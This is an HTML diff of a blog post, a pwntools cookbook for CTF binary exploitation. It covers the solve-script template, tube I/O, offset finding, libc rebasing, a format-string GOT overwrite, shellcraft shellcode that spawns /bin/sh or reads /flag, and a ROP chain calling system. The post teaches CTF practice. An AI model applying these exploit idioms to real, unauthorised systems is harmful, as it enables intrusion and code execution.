@@ -1,0 +1,282 @@
+<!doctype html>
+<html lang="en" data-mode="dark" data-crt="on">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<script>(function(){try{var d=document.documentElement,m=localStorage.getItem('sf.mode');if(!m)m=matchMedia('(prefers-color-scheme: light)').matches?'light':'dark';d.setAttribute('data-mode',m);if(localStorage.getItem('sf.crt')==='on')d.setAttribute('data-crt','on');}catch(e){}})();</script>
+<title>a pwntools cookbook — algoatson.github.io</title>
+<meta name="description" content="The pwntools I reach for from memory — the template, tubes, packing, the ELF/libc helpers, format-string and shellcode one-liners, and the CLI subcommands that replace a pile of little scripts. Real snippets, copy-paste shaped.">
+<meta name="author" content="your name here">
+<link rel="canonical" href="https://algoatson.github.io/p/pwntools-cookbook/">
+<meta property="og:type" content="article">
+<meta property="og:title" content="a pwntools cookbook — algoatson.github.io">
+<meta property="og:description" content="The pwntools I reach for from memory — the template, tubes, packing, the ELF/libc helpers, format-string and shellcode one-liners, and the CLI subcommands that replace a pile of little scripts. Real snippets, copy-paste shaped.">
+<meta property="og:url" content="https://algoatson.github.io/p/pwntools-cookbook/">
+<meta property="og:site_name" content="algoatson.github.io">
+<meta property="og:image" content="https://algoatson.github.io/assets/og/pwntools-cookbook.png"><meta name="twitter:card" content="summary_large_image">
+<link rel="icon" type="image/svg+xml" href="/assets/favicon.svg">
+<link rel="alternate" type="application/rss+xml" title="algoatson.github.io" href="/feed.xml">
+<link rel="stylesheet" href="/assets/style.css">
+<link rel="stylesheet" href="/assets/pygments.css">
+<script type="application/ld+json">{"@context": "https://schema.org", "@type": "Article", "headline": "a pwntools cookbook", "datePublished": "2026-05-26", "dateModified": "2026-05-26", "author": {"@type": "Person", "name": "your name here"}, "publisher": {"@type": "Person", "name": "segfault"}, "description": "The pwntools I reach for from memory — the template, tubes, packing, the ELF/libc helpers, format-string and shellcode one-liners, and the CLI subcommands that replace a pile of little scripts. Real snippets, copy-paste shaped.", "url": "https://algoatson.github.io/p/pwntools-cookbook/", "mainEntityOfPage": "https://algoatson.github.io/p/pwntools-cookbook/", "keywords": "pwn, tooling, ctf"}</script></head>
+<body>
+<a class="skip" href="#main">skip to content</a>
+<div class="progress" aria-hidden="true"></div>
+<div class="wrap">
+  <div class="frame">
+    <span class="frame__legend"><a href="/">algoatson.github.io</a></span>
+    <span class="frame__addr">~/posts</span>
+
+    <header class="bar">
+      <span class="bar__prompt">&#10095; <b>segfault</b>@algoatson.github.io</span>
+      <nav class="nav" aria-label="primary"><a href="/about/">whoami</a><a href="/" aria-current="page">posts</a><a href="/tags/">tags</a></nav>
+      <button class="searchbtn" data-open="search" type="button">grep<kbd>/</kbd></button>
+    </header>
+
+    <main class="main" id="main">
+<a class="backlink" href="/">back to index</a>
+<header class="posthead">
+  <h1>a pwntools cookbook</h1>
+  <div class="meta"><span>2026-05-26</span><span>4 min read</span><a class="tag" href="/tags/pwn/">pwn</a> <a class="tag" href="/tags/tooling/">tooling</a> <a class="tag" href="/tags/ctf/">ctf</a></div>
+</header>
+
+<div class="postwrap has-toc">
+  <aside class="toc" aria-label="table of contents"><span class="toctitle">contents</span><div class="toc">
+<ul>
+<li><a href="#the-boilerplate">the boilerplate</a></li>
+<li><a href="#tubes-talk-to-the-target">tubes — talk to the target</a></li>
+<li><a href="#packing-offsets">packing &amp; offsets</a></li>
+<li><a href="#elf-libc-helpers">ELF &amp; libc helpers</a></li>
+<li><a href="#format-strings">format strings</a></li>
+<li><a href="#shellcode-without-writing-assembly">shellcode without writing assembly</a></li>
+<li><a href="#rop">ROP</a></li>
+<li><a href="#the-cli-is-half-the-value">the CLI is half the value</a></li>
+</ul>
+</div>
+</aside>
+  <article class="prose"><p>pwntools is the standard library for exploitation: it turns "parse this, pack
+that, connect here, attach a debugger" into a handful of calls. Install is
+<code class="highlight">pip install pwntools</code>. This is the slice I use without looking anything up.</p>
+<h2 id="the-boilerplate">the boilerplate<a class="headerlink" href="#the-boilerplate" title="Permanent link">#</a></h2>
+<p>Don't hand-write it — generate it and fill in the blanks:</p>
+<figure class="codeblock"><figcaption><span class="lang">console</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#code-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="code-1"><span class="gp">$ </span>pwn<span class="w"> </span>template<span class="w"> </span>./chal<span class="w"> </span>--host<span class="w"> </span>chal.example.org<span class="w"> </span>--port<span class="w"> </span><span class="m">1337</span><span class="w"> </span>&gt;<span class="w"> </span>solve.py
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<p>That scaffolds the pattern every exploit starts from:</p>
+<figure class="codeblock"><figcaption><span class="fname">solve.py</span><span class="lang">python</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#solvepy-1"> 1</a></span>
+<span class="normal"><a href="#solvepy-2"> 2</a></span>
+<span class="normal"><a href="#solvepy-3"> 3</a></span>
+<span class="normal"><a href="#solvepy-4"> 4</a></span>
+<span class="normal"><a href="#solvepy-5"> 5</a></span>
+<span class="normal"><a href="#solvepy-6"> 6</a></span>
+<span class="normal"><a href="#solvepy-7"> 7</a></span>
+<span class="normal"><a href="#solvepy-8"> 8</a></span>
+<span class="normal"><a href="#solvepy-9"> 9</a></span>
+<span class="normal"><a href="#solvepy-10">10</a></span>
+<span class="normal"><a href="#solvepy-11">11</a></span>
+<span class="normal"><a href="#solvepy-12">12</a></span>
+<span class="normal"><a href="#solvepy-13">13</a></span>
+<span class="normal"><a href="#solvepy-14">14</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="solvepy-1"><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+</span><span id="solvepy-2"><span class="hll"><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./chal&quot;</span><span class="p">)</span>     <span class="c1"># sets arch/bits/os for everything else</span>
+</span></span><span id="solvepy-3"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./libc.so.6&quot;</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span><span id="solvepy-4"><span class="hll">
+</span></span><span id="solvepy-5"><span class="hll"><span class="k">def</span><span class="w"> </span><span class="nf">conn</span><span class="p">():</span>
+</span></span><span id="solvepy-6">    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span><span class="p">:</span>  <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&quot;chal.example.org&quot;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>   <span class="c1"># python3 solve.py REMOTE</span>
+</span><span id="solvepy-7">    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>     <span class="k">return</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">elf</span><span class="o">.</span><span class="n">path</span><span class="p">],</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">GS</span><span class="p">)</span>
+</span><span id="solvepy-8">    <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">elf</span><span class="o">.</span><span class="n">path</span><span class="p">])</span>
+</span><span id="solvepy-9">
+</span><span id="solvepy-10"><span class="n">GS</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;</span>
+</span><span id="solvepy-11"><span class="s2">b *main+42</span>
+</span><span id="solvepy-12"><span class="s2">continue</span>
+</span><span id="solvepy-13"><span class="s2">&quot;&quot;&quot;</span>
+</span><span id="solvepy-14"><span class="n">io</span> <span class="o">=</span> <span class="n">conn</span><span class="p">()</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<p>Setting <code class="highlight">context.binary</code> once configures <code class="highlight">p64</code>, <code class="highlight">asm</code>, <code class="highlight">ROP</code>, and the loglevel to
+match the target. <code class="highlight">args.REMOTE</code> reads from the command line, so one script runs
+locally, under gdb, or against the server.</p>
+<h2 id="tubes-talk-to-the-target">tubes — talk to the target<a class="headerlink" href="#tubes-talk-to-the-target" title="Permanent link">#</a></h2>
+<p><code class="highlight">process</code>, <code class="highlight">remote</code>, <code class="highlight">gdb.debug</code>, and <code class="highlight">ssh</code> all return the same tube interface,
+so the I/O code never changes between local and remote:</p>
+<table>
+<thead>
+<tr>
+<th>call</th>
+<th>use</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code class="highlight">io = process(&quot;./chal&quot;)</code></td>
+<td>run locally</td>
+</tr>
+<tr>
+<td><code class="highlight">io = remote(&quot;host&quot;, 1337)</code></td>
+<td>connect to the server</td>
+</tr>
+<tr>
+<td><code class="highlight">io = gdb.debug(&quot;./chal&quot;, GS)</code></td>
+<td>launch under gdb with a script</td>
+</tr>
+<tr>
+<td><code class="highlight">gdb.attach(io, GS)</code></td>
+<td>attach to an already-running process</td>
+</tr>
+<tr>
+<td><code class="highlight">io.recvuntil(b&quot;name: &quot;)</code></td>
+<td>read up to a delimiter</td>
+</tr>
+<tr>
+<td><code class="highlight">io.recvline()</code> / <code class="highlight">io.recvn(8)</code></td>
+<td>one line / exactly n bytes</td>
+</tr>
+<tr>
+<td><code class="highlight">io.sendline(payload)</code></td>
+<td>send + newline</td>
+</tr>
+<tr>
+<td><code class="highlight">io.sendlineafter(b&quot;&gt; &quot;, payload)</code></td>
+<td>wait for prompt, then send (the workhorse)</td>
+</tr>
+<tr>
+<td><code class="highlight">io.interactive()</code></td>
+<td>hand the shell to your keyboard</td>
+</tr>
+</tbody>
+</table>
+<div class="admonition tip">
+<p class="admonition-title">make gdb.attach actually pop a window</p>
+<p>Set the terminal once and <code class="highlight">gdb.attach</code>/<code class="highlight">gdb.debug</code> open a real split:
+<code class="highlight">context.terminal = [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]</code> (inside tmux). On a fresh box
+that one line saves a lot of swearing.</p>
+</div>
+<h2 id="packing-offsets">packing &amp; offsets<a class="headerlink" href="#packing-offsets" title="Permanent link">#</a></h2>
+<figure class="codeblock"><figcaption><span class="lang">python</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#code-3-1">1</a></span>
+<span class="normal"><a href="#code-3-2">2</a></span>
+<span class="normal"><a href="#code-3-3">3</a></span>
+<span class="normal"><a href="#code-3-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="code-3-1"><span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>              <span class="c1"># -&gt; b&#39;\xef\xbe\xad\xde\x00\x00\x00\x00&#39;</span>
+</span><span id="code-3-2"><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>             <span class="c1"># 8 leaked bytes -&gt; int</span>
+</span><span id="code-3-3"><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">))</span>   <span class="c1"># the leak idiom</span>
+</span><span id="code-3-4"><span class="n">flat</span><span class="p">({</span><span class="mi">72</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">),</span> <span class="mi">80</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="n">win</span><span class="p">)})</span>             <span class="c1"># build a buffer by offset</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<p>Find the overflow offset without counting — send a De Bruijn pattern, read back
+the value that landed in the saved RIP:</p>
+<figure class="codeblock"><figcaption><span class="lang">python</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#code-4-1">1</a></span>
+<span class="normal"><a href="#code-4-2">2</a></span>
+<span class="normal"><a href="#code-4-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="code-4-1"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mi">200</span><span class="p">))</span>
+</span><span id="code-4-2"><span class="c1"># ... crash; read $rip from the core or gdb, e.g. 0x6161616c61616161</span>
+</span><span id="code-4-3"><span class="n">offset</span> <span class="o">=</span> <span class="n">cyclic_find</span><span class="p">(</span><span class="mh">0x6161616c</span><span class="p">)</span>     <span class="c1"># -&gt; exact distance to the return address</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<h2 id="elf-libc-helpers">ELF &amp; libc helpers<a class="headerlink" href="#elf-libc-helpers" title="Permanent link">#</a></h2>
+<p>The <code class="highlight">ELF</code> object is a symbol/address oracle, and it stays correct after you slide
+its base:</p>
+<figure class="codeblock"><figcaption><span class="lang">python</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#code-5-1">1</a></span>
+<span class="normal"><a href="#code-5-2">2</a></span>
+<span class="normal"><a href="#code-5-3">3</a></span>
+<span class="normal"><a href="#code-5-4">4</a></span>
+<span class="normal"><a href="#code-5-5">5</a></span>
+<span class="normal"><a href="#code-5-6">6</a></span>
+<span class="normal"><a href="#code-5-7">7</a></span>
+<span class="normal"><a href="#code-5-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="code-5-1"><span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&quot;main&quot;</span><span class="p">]</span>            <span class="c1"># symbol address (PIE: file offset until .address set)</span>
+</span><span id="code-5-2"><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s2">&quot;puts&quot;</span><span class="p">]</span>            <span class="c1"># GOT slot for puts</span>
+</span><span id="code-5-3"><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s2">&quot;puts&quot;</span><span class="p">]</span>            <span class="c1"># PLT stub for puts</span>
+</span><span id="code-5-4"><span class="n">elf</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">)</span><span class="o">.</span><span class="fm">__next__</span><span class="p">()</span>      <span class="c1"># find bytes in the binary</span>
+</span><span id="code-5-5">
+</span><span id="code-5-6"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&quot;puts&quot;</span><span class="p">]</span> <span class="c1"># rebase libc from one leak...</span>
+</span><span id="code-5-7"><span class="n">system</span>  <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&quot;system&quot;</span><span class="p">]</span>           <span class="c1"># ...and every other symbol is now correct</span>
+</span><span id="code-5-8"><span class="n">binsh</span>   <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;/bin/sh</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">))</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<h2 id="format-strings">format strings<a class="headerlink" href="#format-strings" title="Permanent link">#</a></h2>
+<p><code class="highlight">fmtstr_payload</code> computes the <code class="highlight">%hn</code>/<code class="highlight">%n</code> writes for you — give it the argument
+offset and an <code class="highlight">{address: value}</code> map:</p>
+<figure class="codeblock"><figcaption><span class="lang">python</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#code-6-1">1</a></span>
+<span class="normal"><a href="#code-6-2">2</a></span>
+<span class="normal"><a href="#code-6-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="code-6-1"><span class="c1"># offset = which %N$ slot your input lands in (find with %p spam, or fmtstr_payload&#39;s autodetect)</span>
+</span><span id="code-6-2"><span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="p">{</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s2">&quot;exit&quot;</span><span class="p">]:</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&quot;win&quot;</span><span class="p">]})</span>
+</span><span id="code-6-3"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<p>That overwrites <code class="highlight">exit</code>'s GOT entry with <code class="highlight">win</code>, so the next <code class="highlight">exit()</code> calls your
+function — the canonical format-string-to-control-flow move.</p>
+<h2 id="shellcode-without-writing-assembly">shellcode without writing assembly<a class="headerlink" href="#shellcode-without-writing-assembly" title="Permanent link">#</a></h2>
+<figure class="codeblock"><figcaption><span class="lang">python</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#code-7-1">1</a></span>
+<span class="normal"><a href="#code-7-2">2</a></span>
+<span class="normal"><a href="#code-7-3">3</a></span>
+<span class="normal"><a href="#code-7-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="code-7-1"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s2">&quot;amd64&quot;</span>
+</span><span id="code-7-2"><span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>             <span class="c1"># execve(&quot;/bin/sh&quot;) for the current arch</span>
+</span><span id="code-7-3"><span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">cat</span><span class="p">(</span><span class="s2">&quot;/flag&quot;</span><span class="p">))</span>     <span class="c1"># open+read+write /flag to stdout (great under seccomp)</span>
+</span><span id="code-7-4"><span class="n">asm</span><span class="p">(</span><span class="s2">&quot;xor rdi, rdi; mov al, 60; syscall&quot;</span><span class="p">)</span>   <span class="c1"># or just hand it asm</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<h2 id="rop">ROP<a class="headerlink" href="#rop" title="Permanent link">#</a></h2>
+<p><code class="highlight">ROP</code> assembles chains and finds simple gadgets; the full treatment — <code class="highlight">find_gadget</code>,
+SROP, ret2dlresolve — is its own post: <a href="/p/finding-gadgets/">finding gadgets</a>.</p>
+<figure class="codeblock"><figcaption><span class="lang">python</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#code-8-1">1</a></span>
+<span class="normal"><a href="#code-8-2">2</a></span>
+<span class="normal"><a href="#code-8-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="code-8-1"><span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
+</span><span id="code-8-2"><span class="n">rop</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="s2">&quot;system&quot;</span><span class="p">,</span> <span class="p">[</span><span class="nb">next</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;/bin/sh</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">))])</span>
+</span><span id="code-8-3"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">72</span> <span class="o">+</span> <span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">()</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<h2 id="the-cli-is-half-the-value">the CLI is half the value<a class="headerlink" href="#the-cli-is-half-the-value" title="Permanent link">#</a></h2>
+<p><code class="highlight">pwn</code> is also a toolbox of subcommands that replace one-off scripts:</p>
+<figure class="codeblock"><figcaption><span class="lang">console</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#code-9-1">1</a></span>
+<span class="normal"><a href="#code-9-2">2</a></span>
+<span class="normal"><a href="#code-9-3">3</a></span>
+<span class="normal"><a href="#code-9-4">4</a></span>
+<span class="normal"><a href="#code-9-5">5</a></span>
+<span class="normal"><a href="#code-9-6">6</a></span>
+<span class="normal"><a href="#code-9-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="code-9-1"><span class="gp">$ </span>pwn<span class="w"> </span>checksec<span class="w"> </span>./chal<span class="w">              </span><span class="c1"># mitigations</span>
+</span><span id="code-9-2"><span class="gp">$ </span>pwn<span class="w"> </span>cyclic<span class="w"> </span><span class="m">200</span><span class="w">                   </span><span class="c1"># De Bruijn pattern</span>
+</span><span id="code-9-3"><span class="gp">$ </span>pwn<span class="w"> </span>cyclic<span class="w"> </span>-l<span class="w"> </span>0x6161616c<span class="w">         </span><span class="c1"># ...and the reverse lookup</span>
+</span><span id="code-9-4"><span class="gp">$ </span>pwn<span class="w"> </span>disasm<span class="w"> </span><span class="s2">&quot;4831c0&quot;</span><span class="w">              </span><span class="c1"># bytes -&gt; assembly</span>
+</span><span id="code-9-5"><span class="gp">$ </span>pwn<span class="w"> </span>asm<span class="w"> </span><span class="s2">&quot;mov rax, 1&quot;</span><span class="w">             </span><span class="c1"># assembly -&gt; bytes</span>
+</span><span id="code-9-6"><span class="gp">$ </span>pwn<span class="w"> </span>shellcraft<span class="w"> </span>-f<span class="w"> </span>d<span class="w"> </span>amd64.linux.sh<span class="w">   </span><span class="c1"># dump shellcode for a target</span>
+</span><span id="code-9-7"><span class="gp">$ </span>pwn<span class="w"> </span>phd<span class="w"> </span>./chal<span class="w">                   </span><span class="c1"># a pretty hexdump</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<details class="note">
+<summary>the loop I actually run</summary>
+<p><code class="highlight">python3 solve.py GDB</code> to develop against a breakpoint, <code class="highlight">python3 solve.py</code> to
+sanity-check locally, <code class="highlight">python3 solve.py REMOTE</code> to fire. Same file, three
+modes, because the template wired <code class="highlight">args</code> in from the start. Set
+<code class="highlight">context.log_level = &quot;debug&quot;</code> when the I/O desyncs — it prints every byte sent
+and received, which is almost always where the bug is.</p>
+</details></article>
+</div>
+<section class="related"><span class="related__title">related</span><div class="listing"><a class="row" href="/p/checksec-everything/"><span class="row__date">2026-05-19</span><span class="row__tag">tooling</span><span class="row__title">one keybind to checksec everything</span><span class="row__min">3 min</span></a><a class="row" href="/p/finding-gadgets/"><span class="row__date">2026-05-12</span><span class="row__tag">pwn</span><span class="row__title">finding gadgets: ROPgadget, ropper, one_gadget, pwntools</span><span class="row__min">5 min</span></a><a class="row" href="/p/ret2libc-warmup/"><span class="row__date">2026-01-29</span><span class="row__tag">pwn</span><span class="row__title">ret2libc on a warm-up: stack smash to shell</span><span class="row__min">4 min</span></a></div></section>
+<nav class="pager"><a class="prev" href="/p/rizin-radare2-in-anger/"><span class="lbl">&#8249; newer</span>rizin and radare2 in anger</a><a class="next" href="/p/checksec-everything/"><span class="lbl">older &#8250;</span>one keybind to checksec everything</a></nav></main>
+
+    <footer class="status">
+      <span>15 posts</span>
+      <span class="shade">&#9617;&#9618;&#9619;</span>
+      <span>no trackers · no cookies · no js required to read · copying is encouraged</span>
+      <span class="right">
+        <a href="https://github.com/algoatson">github</a><a href="https://twitter.com/yourname">twitter</a><a href="mailto:you@segfault.sh">email</a>
+        <button class="toggle" data-toggle="mode" type="button">[light]</button>
+        <button class="toggle" data-toggle="crt" type="button">[crt]</button>
+        <a href="/feed.xml">[rss]</a>
+      </span>
+    </footer>
+  </div>
+</div>
+
+<div class="palette-mask" role="dialog" aria-modal="true" aria-label="search">
+  <div class="palette">
+    <div class="palette__count">grep<span class="n">0/0</span><span class="rule"></span>posts</div>
+    <div class="palette__input"><span class="sigil">&gt;</span><input type="text"
+       placeholder="fuzzy search title + body…" autocomplete="off" spellcheck="false" aria-label="search query"></div>
+    <div class="palette__results"></div>
+    <div class="palette__hint"><span><kbd>↑↓</kbd>/<kbd>^j ^k</kbd> move</span><span><kbd>⏎</kbd> open</span><span><kbd>esc</kbd> close</span></div>
+  </div>
+</div>
+<div class="help-mask" role="dialog" aria-modal="true" aria-label="keyboard shortcuts">
+  <div class="help"><h3>keys</h3><dl><dt><kbd>/</kbd></dt><dd>search</dd><dt><kbd>j / k</kbd></dt><dd>move / scroll</dd><dt><kbd>enter</kbd></dt><dd>open</dd><dt><kbd>g g / G</kbd></dt><dd>top / bottom</dd><dt><kbd>t</kbd></dt><dd>toggle light</dd><dt><kbd>?</kbd></dt><dd>this help</dd><dt><kbd>esc</kbd></dt><dd>close</dd></dl></div>
+</div>
+<script src="/assets/search-index.js"></script>
+<script src="/assets/app.js" defer></script>
+</body>
+</html>
